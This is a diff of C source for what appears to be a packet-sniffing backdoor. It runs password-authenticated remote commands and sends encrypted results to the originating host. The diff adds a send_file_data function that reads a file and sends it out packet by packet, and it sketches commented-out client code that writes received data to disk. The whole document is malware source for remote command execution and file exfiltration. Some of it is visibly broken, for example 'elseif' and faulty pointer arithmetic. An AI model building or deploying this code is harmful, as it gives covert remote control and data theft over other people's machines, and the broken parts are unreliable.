@@ -180,39 +180,57 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	if(mode == SERVER_MODE && (strcmp(password, PASSWORD) == 0))
 	{
 		fprintf(stderr, "Password Authenticated. Executing command.\n");
-		send_command(command, ip, ntohs(tcp->th_sport));
+		process_command(command, ip, ntohs(tcp->th_sport));
 		free(command);
 		free(decrypted);
 		return;
 	}
 	else if (mode == CLIENT_MODE && (strcmp(password, PASSWORD) == 0))
 	{
-		/*char[256] fileName;
+		/*
+		FILE* fp;
+		char fileName[256];
+		char* data;
 		int packetMode;
 		int transferMode;
-		//packetMode= atoi(command[0]);
-		/*if (packetMode == TRANSFER_MODE){
-			strncpy(fileName,command+4, 255);
-			char* end = strstr(fileName, " ")
-			end[0] = '\0';
-			transferMode = atoi(command[2]);
+		
+		if(sscanf(command, "%d", &packetMode) < 0) {
+			fprintf(stderr, "scanning error\n");
+			return;
+		}
+		command +=1;
+		if (packetMode == TRANSFER_MODE){
+			if(sscanf(command, "%d %s", &transferMode, fileName ) < 0) {
+				fprintf(stderr, "scanning error\n");
+				return;
+			}
+			
 			if (transferMode == CREATE_MODE){
 			 	if( (_access( fileName, 0 )) != -1 ) {
-			 		int count=0;
-			 		while((_access( fileName + count, 0 )) != -1){
+			 		char tempName[256];
+			 		
+			 		int count=1;
+			 		sprintf(tempName, "%s%d", fileName, count);
+			 		while((_access( tempName, 0 )) != -1){
+			 			sprintf(tempName, "%s%d", fileName, count);
 			 			count++;
+			 			
 			 		}
 					//rename(backup) old file
-					rename(fileName, fileName+count);
-					//create empty file
+					rename(fileName, tempName);
+					
 					
 				}
 				
 			}
+			data = command + strstr(command, fileName) + strlen(fileName); 
 			//open file and append payload data to file
-			fopen(fileName, "a+");
+			fp = fopen(fileName, "a+");
+			if(fp==NULL){fprintf(stderr, "file open error\n"); return;}
+			fwrite(data, sizeof(char), strlen(data), fp);
+			fclose(fp);
 			
-		} else{// is command output
+		} elseif(packetMode == RESPONSE_MODE){// is command output
 			//print command results to stdout
 			printf("%s\n", command);
 		}*/
@@ -266,7 +284,7 @@ char * parse_cmd(char * data)
 	return command;
 }
 /*--------------------------------------------------------------------------------------------------------------------
--- FUNCTION: send_command
+-- FUNCTION: process_command
 -- 
 -- DATE: 2014/09/06
 -- 
@@ -282,7 +300,7 @@ char * parse_cmd(char * data)
 -- 
 -- NOTES: Processes a command and gets the results.  encrypts and sends packet of results to originating host
 ----------------------------------------------------------------------------------------------------------------------*/
-int send_command(char * command, const struct ip_struct * ip, const int dest_port)
+int process_command(char * command, const struct ip_struct * ip, const int dest_port)
 {
 	FILE *fp;
 
@@ -304,7 +322,7 @@ int send_command(char * command, const struct ip_struct * ip, const int dest_por
 	{
 		cmd_results[strlen(cmd_results)-1] = '\0';
 		//Format packet payload
-		sprintf(packet, "%s %d %s%s%s", PASSWORD, CLIENT_MODE, CMD_START, cmd_results, CMD_END);
+		sprintf(packet, "%s %d %s%s%s" /* "%s %d %s%d%s%s" */, PASSWORD, CLIENT_MODE, CMD_START, /* RESPONSE_MODE,*/cmd_results, CMD_END);
 		printf("Packet: %s\n", packet);
 		//Encrypt payload
 		
@@ -319,3 +337,49 @@ int send_command(char * command, const struct ip_struct * ip, const int dest_por
 	
 	return 0;
 }
+
+int send_file_data(char * fileName, const struct ip_struct * ip, const int dest_port){
+	FILE* fp;
+	char data[PKT_SIZE];
+	int count = 0;
+	int transferMode;
+	
+	char packet[PKT_SIZE];
+	char src[BUFFER];
+	char dst[BUFFER];
+
+	strcpy(src, inet_ntoa(ip->ip_dst));
+	strcpy(dst, inet_ntoa(ip->ip_src));
+	
+	fp = fopen(fileName, "r");
+	if(fp==NULL){fprintf(stderr, "file open error."); return;}
+	//read file
+	while(fgets(data, PKT_SIZE - 1, fp) != NULL)
+	{
+		if(count ==0){
+			transferMode = CREATE_MODE;
+		}else {
+			transferMode = APPEND_MODE;
+		}
+		
+		
+		//Format packet payload
+		sprintf(packet, "%s %d %s%d %d %s %s%s", PASSWORD, CLIENT_MODE, CMD_START, TRANSFER_MODE, transferMode, fileName, data, CMD_END);
+		printf("Packet: %s\n", packet);
+		//Encrypt payload
+		
+		//Send it over to the client
+		iSeed(xor_key, 1);
+		send_packet(xor_cipher(packet, strlen(packet)), strlen(packet), src, dst, dest_port);
+		
+		memset(packet, 0, sizeof(packet));
+		memset(data, 0, sizeof(data));
+		count ++;
+	}
+
+	//
+	fclose(fp);
+	
+	
+}
+
